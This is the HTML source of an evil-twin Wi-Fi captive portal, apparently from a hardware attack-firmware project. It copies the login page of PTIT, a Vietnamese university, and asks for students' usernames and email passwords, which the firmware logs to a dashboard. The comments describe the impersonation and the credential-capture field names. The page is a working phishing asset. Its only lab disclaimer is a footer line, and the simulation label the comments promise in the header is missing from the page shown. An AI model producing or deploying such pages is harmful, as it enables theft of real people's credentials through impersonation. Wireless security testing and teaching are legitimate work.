<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>HỌC VIỆN CÔNG NGHỆ BƯU CHÍNH VIỄN THÔNG</title>
<!--
  Trang portal cho payload `wifi_evil_portal` / `wifi_evil_twin` (PLAN §2.4).
  Bố cục dựng lại theo trang đăng nhập captive portal của PTIT (header logo +
  "Welcome to PTIT", hai trường Username/Password, nút CONNECT đỏ).

  Ràng buộc (src/core/evil_twin.h): tự chứa, không tài nguyên ngoài (AP không
  có Internet), POST về chính nó, nhỏ hơn 16384 byte — nên CSS nằm inline và
  logo được nhúng base64 (logo gốc 509x490 nén còn ~90px, 64 màu).

  Hai trường form giữ đúng tên mà firmware nhận dạng (`username`, `password`;
  evilTwin::parseFormCredentials khớp không phân biệt hoa thường với
  username/login/user/account/email + password/pass/pwd/passwd), nên dashboard
  ghi `Portal #n: <username> / <password>`.

  Nhãn "MÔ PHỎNG" ở header giữ quyết định lab: trang không mạo danh tổ chức.
  Nạp lại: pio run -t buildfs && pio run -t uploadfs
-->
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0; padding: 0; min-height: 100vh;
    font-family: "Avant Garde", Tahoma, "Century Gothic", CenturyGothic, AppleGothic, sans-serif;
    background: #55585c radial-gradient(circle at 50% 35%, #73767a 0, #4a4d51 60%, #3c3f42 100%);
    color: #fff;
  }
  #header {
    background: #fff; padding: 14px 0;
    box-shadow: 0 1px 4px rgba(0, 0, 0, .25);
  }
  .branch {
    width: min(760px, 92%); margin: 0 auto;
    display: flex; align-items: center; gap: 12px;
  }
  .branch img { width: 90px; height: 87px; flex: none; }
  .names { min-width: 0; }
  .vi-name { display: block; color: #d7182a; font-weight: bold; font-size: 25px; line-height: 1.15; }
  .en-name { display: block; color: #001789; font-size: 21px; line-height: 1.2; }
  .lab {
    margin-left: auto; flex: none; align-self: flex-start;
    font-size: 11px; letter-spacing: .5px; color: #9aa0a6;
    border: 1px solid #d7dade; border-radius: 4px; padding: 2px 6px;
  }
  main { width: min(600px, 92%); margin: 8vh auto 0; text-align: center; }
  .welcome { color: #ff1b1b; font-size: 1.5em; font-weight: 550; margin: 0 0 5px; }
  .brand {
    display: inline-block; color: #d11616; font-size: 3.5em; font-weight: bold;
    line-height: 1.1; border-bottom: 4px solid #d11616; padding-bottom: 2px;
  }
  form { width: 70%; margin: 24px auto 0; }
  .row { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
  .row label { flex: none; width: 96px; text-align: right; font-weight: bold; color: #fff; font-size: 15px; }
  .row input {
    flex: 1; min-width: 0; height: 30px; border: 0; border-radius: 2px;
    padding: 0 6px; font-size: 13px; font-family: Tahoma, sans-serif; color: #222;
  }
  .row input:focus { outline: 2px solid #001789; outline-offset: 1px; }
  button {
    display: block; margin: 22px auto 0; cursor: pointer;
    padding: 12px 56px; border-radius: 40px;
    border: 2px solid #efd4d4; background: #d7182a; color: #fff;
    font: 700 20px/1 "Century Gothic", Tahoma, sans-serif; letter-spacing: 1px;
  }
  button:active { background: #b01222; }
  .note { width: min(520px, 92%); margin: 26px auto 40px; font-size: 12px; line-height: 1.5; color: #dfe2e5; }
  @media (max-width: 720px) {
    .branch { width: 95%; gap: 8px; }
    .branch img { width: 44px; height: 42px; }
    .vi-name { font-size: 12px; }
    .en-name { font-size: 10px; }
    main { margin-top: 15vh; }
    .brand { font-size: 2.6em; }
    form { width: 100%; }
    .row label { width: 84px; font-size: 14px; }
  }
</style>
</head>

<main>
  <p class="welcome">Welcome to</p>
  <div class="brand">PTIT</div>
  <form method="post" action="/">
    <div class="row">
      <label for="u">Username :</label>
      <input id="u" name="username" type="text" placeholder="Nhập username không có @stu.ptit.edu"
             maxlength="25" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" required>
    </div>
    <div class="row">
      <label for="p">Password :</label>
      <input id="p" name="password" type="password" placeholder="Password email"
             maxlength="25" autocomplete="off" required>
    </div>
    <button type="submit">CONNECT</button>
  </form>
</main>

<p class="note">Trang lab — mô phỏng cổng đăng nhập để kiểm thử evil twin. Không gửi dữ liệu ra ngoài thiết bị.</p>
